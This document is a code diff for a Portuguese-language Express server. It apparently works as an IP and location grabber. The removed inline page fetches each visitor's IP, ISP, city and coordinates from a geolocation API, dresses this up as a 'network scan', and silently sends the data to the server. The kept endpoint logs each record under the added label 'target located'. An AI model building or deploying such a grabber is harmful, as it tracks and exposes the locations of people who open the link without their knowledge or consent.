@@ -1,158 +1,26 @@
 const express = require('express');
+const path = require('path');
 const app = express();
-const PORT = 3000;
+const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// Rota principal que entrega a interface visual
+// Serve a interface visual para o usuário
 app.get('/', (req, res) => {
-    res.send(`
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel de Geolocalização</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <style>
-        * { box-sizing: border-box; font-family: Arial, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #f4f4f4; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); padding: 20px; }
-        .header { display: flex; justify-content: space-between; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; font-size: 14px; color: #666; }
-        .progress-section { background: #fafafa; border: 1px solid #eee; padding: 15px; border-radius: 6px; margin-bottom: 20px; }
-        .progress-bar-container { background: #e0e0e0; height: 15px; border-radius: 10px; margin-top: 10px; overflow: hidden; position: relative; }
-        .progress-bar { background: #8cd867; height: 100%; width: 0%; transition: width 0.1s linear; }
-        .progress-text { position: absolute; right: 10px; top: -2px; font-size: 12px; font-weight: bold; }
-        .content-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        @media (max-width: 768px) { .content-grid { grid-template-columns: 1fr; } }
-        .data-panel, .map-panel { border: 1px solid #ddd; border-radius: 6px; padding: 15px; min-height: 380px; }
-        .data-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px dashed #eee; font-size: 14px; }
-        .data-item span:first-child { color: #555; font-weight: bold; }
-        .blur { filter: blur(6px); opacity: 0.3; pointer-events: none; transition: all 1s ease; }
-        #map { width: 100%; height: 100%; min-height: 340px; border-radius: 4px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <div class="header">
-        <div><strong>Painel de Varredura IP</strong></div>
-        <div><strong>Data:</strong> <span id="current-date"></span></div>
-    </div>
-
-    <div class="progress-section">
-        <label><strong>Pesquisa pelo dispositivo atual</strong></label>
-        <div id="status-text" style="font-size: 12px; color: #777;">Iniciando conexões de rede...</div>
-        <div class="progress-bar-container">
-            <div class="progress-bar" id="bar"></div>
-            <div class="progress-text" id="percent">0%</div>
-        </div>
-    </div>
-
-    <div class="content-grid">
-        <div class="data-panel">
-            <h3 style="margin-bottom: 15px; color: #006699;">Dados obtidos</h3>
-            <div id="data-body" class="blur">
-                <div class="data-item"><span>Endereço IP:</span> <span id="ip">-</span></div>
-                <div class="data-item"><span>Provedor/Operadora:</span> <span id="org">-</span></div>
-                <div class="data-item"><span>País:</span> <span id="pais">-</span></div>
-                <div class="data-item"><span>Estado:</span> <span id="estado">-</span></div>
-                <div class="data-item"><span>Cidade:</span> <span id="cidade">-</span></div>
-                <div class="data-item"><span>Latitude:</span> <span id="lat">-</span></div>
-                <div class="data-item"><span>Longitude:</span> <span id="lon">-</span></div>
-            </div>
-        </div>
-
-        <div class="map-panel">
-            <div id="map" class="blur"></div>
-        </div>
-    </div>
-</div>
-
-<script>
-    document.addEventListener("DOMContentLoaded", async () => {
-        document.getElementById("current-date").innerText = new Date().toLocaleDateString('pt-BR');
-        
-        const progressBar = document.getElementById("bar");
-        const percentText = document.getElementById("percent");
-        const statusText = document.getElementById("status-text");
-        
-        try {
-            statusText.innerText = "Rastreando pacotes de rede e operadora...";
-            const resposta = await fetch('https://ipapi.co/json/');
-            const dados = await resposta.json();
-
-            let progresso = 0;
-            const intervalo = setInterval(() => {
-                progresso += Math.floor(Math.random() * 5) + 2;
-                
-                if (progresso >= 100) {
-                    progresso = 100;
-                    clearInterval(intervalo);
-                    
-                    document.getElementById("ip").innerText = dados.ip || "Não identificado";
-                    document.getElementById("org").innerText = dados.org || "Não identificado";
-                    document.getElementById("pais").innerText = dados.country_name || "Não identificado";
-                    document.getElementById("estado").innerText = dados.region || "Não identificado";
-                    document.getElementById("cidade").innerText = dados.city || "Não identificado";
-                    document.getElementById("lat").innerText = dados.latitude || "0";
-                    document.getElementById("lon").innerText = dados.longitude || "0";
-
-                    document.getElementById("data-body").classList.remove("blur");
-                    document.getElementById("map").classList.remove("blur");
-                    statusText.innerText = "Dispositivo localizado com sucesso.";
-
-                    if (dados.latitude && dados.longitude) {
-                        const map = L.map('map').setView([dados.latitude, dados.longitude], 12);
-                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                        L.marker([dados.latitude, dados.longitude]).addTo(map).bindPopup(dados.org || "Dispositivo").openPopup();
-                    }
-
-                    enviarAoServidor(dados);
-                }
-
-                progressBar.style.width = progresso + "%";
-                percentText.innerText = progresso + "%";
-            }, 60);
-
-        } catch (erro) {
-            statusText.innerText = "Falha na varredura de rede.";
-            console.error("Erro ao buscar dados:", erro);
-        }
-
-        function enviarAoServidor(dados) {
-            fetch('/api/captura', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    ip: dados.ip,
-                    provedor: dados.org,
-                    cidade: dados.city,
-                    estado: dados.region,
-                    latitude: dados.latitude,
-                    longitude: dados.longitude
-                })
-            }).catch(e => console.log("Erro ao enviar dados ao console."));
-        }
-    });
-</script>
-</body>
-</html>
-    `);
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Rota interna para receber e exibir os logs no terminal
+// Recebe e exibe os dados capturados no terminal
 app.post('/api/captura', (req, res) => {
     console.log(`\n=================================`);
-    console.log(`[REGISTRO] Dados consolidados:`);
+    console.log(`[ALVO LOCALIZADO] Dados recebidos:`);
     console.log(`=================================`);
     console.table(req.body);
     console.log(`=================================\n`);
+
     res.json({ status: "sucesso" });
 });
 
 app.listen(PORT, () => {
-    console.log(`\n[OK] Servidor único rodando com sucesso!`);
-    console.log(`Acesse no seu navegador: http://localhost:${PORT}\n`);
+    console.log(`[OK] Servidor rodando na porta ${PORT}`);
 });
